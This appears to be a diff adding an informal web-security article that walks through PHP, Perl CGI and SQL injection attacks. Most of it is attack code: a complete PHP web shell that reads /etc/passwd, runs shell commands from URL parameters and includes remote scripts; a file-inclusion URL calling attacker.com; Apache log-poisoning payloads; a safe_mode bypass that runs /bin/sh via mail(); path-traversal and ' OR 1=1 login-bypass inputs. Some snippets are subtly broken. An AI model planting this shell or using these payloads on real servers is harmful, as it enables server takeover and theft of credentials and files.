@@ -1,0 +1,298 @@
+Inside Web Security by Alexandre Jaquet
+----------------------------------------
+
+First I'm not an security expert or an elite hacker, I wrote only
+a short article of my *basic knowledege* in insecure / secure web 
+programming.
+
+I will summarize some quit simple attacks that should be made.
+
+php
+--------
+
+An attacker would gain access to a complete web server or just
+deface some page.
+
+He can create an hosting account into a particular web hosting agency
+or he 've already hacked an ftp account into it
+and then simply put on it a simple script like this one :
+
+<?php 
+/* Simple security check by Alexandre Jaquet */
+
+$action = $_GET['action'];
+
+if ($action == "etcpasswd") {
+	readPasswd();
+}elseif ($action == "openfile") {
+	openFile();	
+}elseif ($action == "execute") {
+	executeCommand();
+}elseif ($action == "include") {
+	includeExploit();
+}elseif ($action == "phpinfo") {
+	phpinfo();
+}elseif ($action == "issafe") {
+	isSafe ();
+}elseif ($action == "notallowed") {
+	notAllowed ();
+}elseif ($action == "changedir") {
+	changeDirectory ();
+}
+
+/* Try to read password file*/
+function readPasswd () {
+	$fh = fopen ('/etc/passwd','r');
+	while(!feof($fh)) {
+	 $content .= fread($fh,4096);
+	 echo "$content";
+	}
+	fclose($fh);
+}
+
+/* Try to read password file*/
+function openFile () {
+	$file = $_GET['file'];
+	echo "file : $file <br />";
+	$fh = fopen ($file,'r');
+	while(!feof($fh)) {
+	 $content .= fread($fh,4096);
+	 echo "$content";
+	}
+	fclose($fh);
+}
+function includeExploit () {
+	$url = $_GET['url'];
+	include($url);
+}
+/* Execute command passed in parameter ?*/
+function executeCommand() {
+	$cmd = $_GET['action'];
+	system ($cmd);
+}
+/* Does our server use safe mode ?*/
+function isSafe () {
+	echo 'safe_mode = ' . ini_get('safe_mode'); 
+	echo 'safe_mode_exec_dir = ' . ini_get('safe_mode_exec_dir');
+}
+/* Get our server disabled functions */
+function notAllowed () {
+	echo 'disable_functions = ' . ini_get('disable_functions'); 	
+}
+
+/* Test to change directory and read it's content */
+/* opendir doesn't work when SAFE MODE IS ACTIVATED */
+function changeDirectory () {
+	$directory = $_GET['directory'];
+	chdir($directory);
+	$dh  = opendir($directory);
+	while (false !== ($filename = readdir($dh))) {
+	   $files[] = $filename;
+	   echo "file : $file []";
+	}
+}
+?>
+
+Here is a piece of code who try to read passwd file
+
+/* Try to read password file*/
+function readPasswd () {
+	$fh = fopen ('/etc/passwd','r');
+	while(!feof($fh)) {
+	 $content .= fread($fh,4096);
+	 echo "$content";
+	}
+	fclose($fh);
+}
+
+we can change the code for allowing to read any file from the web
+by simply passing the file by parameter
+
+then http://localhost/test.php?file=/etc/passwd will open and read the file
+
+function readFile () {
+	$file = $_GET['file'];
+	$fh = fopen ($file,'r');
+	while(!feof($fh)) {
+	 $content .= fread($fh,4096);
+	 echo "$content";
+	}
+	fclose($fh);
+}
+
+Here is a well know exploit, the file inclusion
+an attacker should be able to put url in param and then
+code will be executed in our server
+
+http://localhost/test.php?include=http://attacker.com/script.php
+
+function includeExploit () {
+	$url = $_GET['url'];
+	include($url);
+}
+
+to avoid this attack server administrator should set register_global to off
+
+Another well know attack was a bug in php4 that allowed arbitratry code execution
+with apache log
+
+here a simple exemple 
+
+http://localhost/<?$filep=fopen("http://127.0.0.1/file.txt"," rb");?>
+http://localhost/<?$contents=fread($filep,]);?>
+http://localhost/<?$filep=fopen("c:/Apache2/htdocs/test.txt","wb");?>
+http://localhost/<?fwrite($filep,$contents);?>
+http://localhost/unexist.htm
+http://localhost/php/php.exe?c:\apache2\logs\access.log
+the last line will execute the php code who have been logged 
+
+This exploit still work on unpatched php version ... (windows and linux)
+
+And other old exploit discovered by Wojciech Purczynsk for bypassing the safe_mode :
+present in PHP  4.0.3 to 4.2.2  
+<?
+$script=tempnam("/tmp", "script");
+$cf=tempnam("/tmp", "cf");
+
+$fd = fopen($cf, "w");
+fwrite($fd, "OQ/tmp
+Sparse=0
+R$*" . chr(9) . "$#local $@ $1 $: $1
+Mlocal, P=/bin/sh, A=sh $script");
+fclose($fd);
+
+$fd = fopen($script, "w");
+fwrite($fd, "rm -f $script $cf; ");
+fwrite($fd, $cmd);
+fclose($fd);
+
+mail("nobody", "", "", "", "-C$cf");
+?>
+
+it's will be harder for the
+attacker to gain total access to the remote server, safe_mode
+disable opendir and fopen of files who are not present in current directory
+
+it's disable system  and exec programs who are not present in current directory to
+so the attacker will need to put on the directory an external compiled program, 
+he could know the server version by executing : 
+
+http://djmarketplace.no-ip.biz/test.php?action=phpinfo ...
+
+the attacker could code a simple script in C and do his nasty job ...
+
+...
+
+
+Perl cgi web security holes
+--------------------------
+
+Just as php you will find some similar vulnerabilities,
+
+open and system command
+
+here is a simple exemple of vulnerable code :
+
+	sub loadFile {
+		open (FILE, "$page") or die "cannot open file $page";
+		print "Content-type: text/html\n\n";
+		while (<FILE>) {
+			print $_;	
+		}
+		close (FILE);	    
+    }
+
+attacker could pass any file into open function like : 
+
+http://localhost/cgi-bin/script.pl?file=2Fetc2Fpasswd
+
+will open and print the passwd file content
+
+a common solution used to avoid that will to include an extention to the filename
+
+	sub loadFile {
+		open (FILE, "$page.html") or die "cannot open file $page.html";
+		print "Content-type: text/html\n\n";
+		while (<FILE>) {
+			print $_;	
+		}
+		close (FILE);	    
+    }
+
+but this code is still vulnerable to null character escape 
+
+http://localhost/cgi-bin/script.pl?file=2Fetc2Fpasswd%00
+
+Another very bad coding we found in many script is code like this :
+
+	@params = $query->param;
+	foreach $param (@params) {
+		${$param} = $query->param($param) || '';	
+	};
+	
+that allow any kind of variables creation
+http://localhost/cgi-bin/script.pl?user=admin&level=2&server=dir=/etc .....
+
+this bad coding should be replaced by : 
+$name = $query->param('name'); ...
+
+Just as php we should take care when passing parameter to system
+
+	sub execute {
+		my $cmd = $query->param("cmd");
+		system ($cmd);
+	}
+Attacker should pass commands separated by %3b (;) ...
+
+SQL Injection
+---------------------
+
+SQL Injection permit the arbitary sql queries to gain not tolered data, or to 
+bypass identification
+
+Here a sample piece of code who is vulnerable :
+
+sub login {
+    my $username = $query->param('user_name');
+    my $userpassword = $query->param('user_password');
+
+   my ($user_name,$user_password)= ();
+   ($user_name,$user_password)=sqlSelect("nom_utilisateur , mot_de_passe",
+					     "admin", "nom_utilisateur = '$username' AND mot_de_passe='$userpassword'");
+    
+	if ($user_name && $user_password) {
+	    
+	#init session ...
+	}
+}
+
+sub sqlSelect {
+	my $select = shift || '';
+	my $from = shift || '';
+	my $where = shift || '';
+	my $other = shift || '';
+
+
+	my $sql="SELECT SQL_CACHE $select ";
+	$sql.="FROM $from " if $from;
+	$sql.="WHERE $where " if $where;
+	$sql.="$other" if $other;
+	my ($c)=$dbh->prepare($sql) or die "Sql has gone to hell\n";
+
+	if(not ($c->execute())) {
+		my $err=$dbh->errstr;
+		return undef;
+	}
+	my (@r)=$c->fetchrow();
+	$c->finish();
+	return @r;
+}
+
+
+If we pass argument like username : admin password : ' OR 1=1 
+we gain admin level to the web application.
+
+How is that work ? the sql query passed to the db server will be
+
+SELECT nom_utilisateur, mot_de_passe, level FROM personne WHERE nom_utilisateur = 'admin' AND
+mot_de_passe = '' OR 1=1 1=1 will always return true that's why we will got access
